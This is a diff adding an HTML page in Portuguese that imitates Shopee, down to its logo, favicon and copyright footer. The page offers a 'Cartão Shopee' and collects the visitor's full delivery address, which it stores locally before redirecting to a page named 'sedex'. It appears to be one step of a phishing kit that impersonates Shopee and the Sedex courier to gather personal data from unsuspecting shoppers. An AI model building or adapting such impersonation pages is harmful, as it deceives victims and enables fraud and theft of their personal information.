@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <title>Cartão Shopee - Confirmar CEP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: white;
+            color: #333;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .main-content {
+            max-width: 500px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            margin: 40px auto;
+        }
+
+        .form-label {
+            font-weight: bold;
+        }
+
+        .btn-custom {
+            background-color: #ee4d2d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 15px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+    }
+    </style>
+    
+       <style>
+      .flasher-container {
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        z-index: 9999;
+        width: 300px;
+      }
+
+      .flasher-container .flasher-message {
+        background-color: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+        padding: 10px;
+        margin-bottom: 10px;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+
+      .flasher-container .flasher-message.success {
+        background-color: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+      }
+
+    </style>
+</head>
+<body>
+     <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PZGDSCMH');</script>
+<!-- End Google Tag Manager -->
+    
+    <div id="flasher-container" class="flasher-container"></div>
+    <div class="header">
+        <img style="width: 120px;" src="images/shopee-logo.png" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <h2>Endereço de Entrega</h2>
+        <p>Informe onde você deseja receber seu cartão</p>
+        <form id="form-endereco">
+            <div class="mb-3">
+                <label for="cep" class="form-label">CEP</label>
+                <input type="text" class="form-control" id="cep" onkeyup="formatCep(this)" onload="formatCep(this)" onblur="buscarCEP()" placeholder="00000-000" maxlength="9" required="">
+            </div>
+            <div class="mb-3">
+                <label for="rua" class="form-label">Rua</label>
+                <input type="text" class="form-control" id="rua" placeholder="Digite sua rua">
+            </div>
+            <div class="mb-3 d-flex align-items-center">
+                <div class="flex-grow-1 me-2">
+                    <label for="numero" class="form-label">Número</label>
+                    <input type="text" class="form-control" id="numero">
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="sem-numero">
+                    <label class="form-check-label" for="sem-numero">Sem número</label>
+                </div>
+            </div>
+            <div class="mb-3">
+                <label for="complemento" class="form-label">Complemento (opcional)</label>
+                <input type="text" class="form-control" id="complemento">
+            </div>
+            <div class="mb-3">
+                <label for="bairro" class="form-label">Bairro</label>
+                <input type="text" class="form-control" id="bairro">
+            </div>
+            <div class="mb-3 d-flex">
+                <div class="flex-grow-1 me-2">
+                    <label for="cidade" class="form-label">Cidade</label>
+                    <input type="text" class="form-control" id="cidade">
+                </div>
+                <div>
+                    <label for="estado" class="form-label">Estado</label>
+                    <select class="form-select" id="estado">
+                        <option value="AC">AC</option>
+                        <option value="AL">AL</option>
+                        <option value="AP">AP</option>
+                        <option value="AM">AM</option>
+                        <option value="BA">BA</option>
+                        <option value="CE">CE</option>
+                        <option value="DF">DF</option>
+                        <option value="ES">ES</option>
+                        <option value="GO">GO</option>
+                        <option value="MA">MA</option>
+                        <option value="MT">MT</option>
+                        <option value="MS">MS</option>
+                        <option value="MG">MG</option>
+                        <option value="PA">PA</option>
+                        <option value="PB">PB</option>
+                        <option value="PR">PR</option>
+                        <option value="PE">PE</option>
+                        <option value="PI">PI</option>
+                        <option value="RJ">RJ</option>
+                        <option value="RN">RN</option>
+                        <option value="RS">RS</option>
+                        <option value="RO">RO</option>
+                        <option value="RR">RR</option>
+                        <option value="SC">SC</option>
+                        <option value="SP">SP</option>
+                        <option value="SE">SE</option>
+                        <option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+            <button type="button" class="btn-custom" onclick="salvarEndereco()">Confirmar endereço</button>
+        </form>
+    </div>
+
+    <script>
+        // Função para exibir mensagens no DOM
+        function showMessage(type, message) {
+          const container = document.getElementById("flasher-container");
+          const div = document.createElement("div");
+          div.className = `flasher-message ${type}`;
+          div.textContent = message;
+
+          container.appendChild(div);
+
+          setTimeout(() => {
+            div.remove();
+          }, 3000);
+        }
+        
+        // Função para formatar CEP em tempo real
+        function formatCep(input) {
+          let cep = input.value.replace(/\D/g, ""); // Remove caracteres não numéricos
+
+          if (cep.length > 5) {
+            input.value = cep.replace(/(\d{5})(\d+)/, "$1-$2");
+          } else {
+            input.value = cep;
+          }
+        }
+        
+        // Adiciona evento ao input para formatar CEP em tempo real
+        document.getElementById("cep").addEventListener("input", function () {
+          formatCep(this);
+        });
+        
+        // Função para remover traços do CEP
+        function removeCepFormatting(cep) {
+          return cep.replace(/-/g, "");
+        }
+        
+        function buscarCEP() {
+            const cepInput = document.getElementById("cep");
+            const cepValue = cepInput.value;
+            const cepFormatado = removeCepFormatting(cepValue);
+
+            if (cepFormatado) {
+                fetch(`https://viacep.com.br/ws/${cepFormatado}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            document.getElementById('rua').value = data.logradouro || '';
+                            document.getElementById('bairro').value = data.bairro || '';
+                            document.getElementById('cidade').value = data.localidade || '';
+                            document.getElementById('estado').value = data.uf || '';
+                        } else {
+                            console.error('CEP não encontrado.');
+                        }
+                    })
+                    .catch(() => console.error('Erro ao buscar o CEP.'));
+            }
+        }
+
+        function salvarEndereco() {
+            const endereco = {
+                cep: document.getElementById('cep').value,
+                rua: document.getElementById('rua').value,
+                numero: document.getElementById('sem-numero').checked ? 'Sem número' : document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                bairro: document.getElementById('bairro').value,
+                cidade: document.getElementById('cidade').value,
+                estado: document.getElementById('estado').value
+            };
+
+            if (!endereco.cep || !endereco.rua || !endereco.numero || !endereco.bairro || !endereco.cidade || !endereco.estado) {
+                showMessage("error", "Por favor, preencha todos os campos obrigatórios.");
+                return;
+            }
+
+            localStorage.setItem('enderecoCliente', JSON.stringify(endereco));
+            window.location.href = '../sedex/index.html';
+        }
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+Copyright 2025 Shopee. Todos os direitos reservados.<br>
+
+Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+
+</body>
+</html>
